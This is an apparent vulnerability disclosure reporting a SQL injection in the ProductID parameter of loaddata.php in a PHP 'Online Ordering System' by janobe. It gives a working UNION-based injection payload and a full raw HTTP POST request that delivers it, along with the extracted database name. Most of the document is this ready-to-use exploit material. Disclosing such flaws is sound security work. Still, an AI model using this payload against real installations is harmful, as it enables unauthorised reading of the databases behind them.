# Online Ordering System By janobe has SQL injection vulnerability

Author： k0xx

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/admin/orders/loaddata.php

Vulnerability location: /ordering/admin/orders/loaddata.php&ProductID //ProductID is Injection point

[+]Payload: ProductID=-2' union select 1,2,3,4,5,6,database(),8,9,10,11,12,13,14,15,16,17,18--+ //ProductID is Injection point

Current database name: multistoredb

```sql
POST /ordering/admin/orders/loaddata.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

ProductID=-2' union select 1,2,3,4,5,6,database(),8,9,10,11,12,13,14,15,16,17,18--+
```

![image](https://user-images.githubusercontent.com/54017627/168951027-0398e6e6-9ab4-4238-a7cf-1eac9caf8b32.png)

![image](https://user-images.githubusercontent.com/54017627/168951106-9ff9c493-0a91-41f6-a34b-ee44160819b0.png)
